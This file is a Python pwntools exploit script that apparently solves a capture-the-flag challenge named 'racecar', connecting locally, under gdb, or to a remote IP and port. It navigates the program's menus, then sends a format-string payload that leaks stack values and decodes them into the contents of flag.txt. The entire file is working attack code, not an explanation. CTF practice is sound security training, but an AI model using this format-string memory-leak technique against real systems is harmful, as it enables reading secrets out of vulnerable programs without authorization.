#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF("./racecar")
context.terminal = ['tmux', 'splitw', '-hb']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return (gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))
    if args.REMOTE:
        return (remote('46.101.23.188', 32548), ELF('/usr/lib/libc.so.6', checksec=False))
    else:
        return (process([exe.path] + argv, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))

gdbscript = '''
b *car_menu+881
'''.format(**locals())

io, elf = start()

# get to exploitable prompt
io.recvuntil(b"Name: ")
io.sendline(b"John")
io.recvuntil(b"Nickname: ")
io.sendline(b"Jdawg")
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"> ")
io.sendline(b"2")
io.recvuntil(b"> ")
io.sendline(b"2")
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"> ")

# deploy the exploit
fmt_str = b"%12$d.%13$d.%14$d.%15$d.%16$d.%17$d.%18$d.%19$d.%20$d.%21$d.%22$d.%23$d"
io.sendline(fmt_str)

# grab the contents of flag.txt
io.recvuntil(b"this:")
io.recvline()
data = io.recvline().strip().split(b".")

# decode the flag packed as ints
flag = ""
for b in data:
    for n in range(4):
        flag += chr((int(b) >> (n*8)) & 0xff) # bit magicks

log.success(f"Got flag: {flag}")

io.interactive()
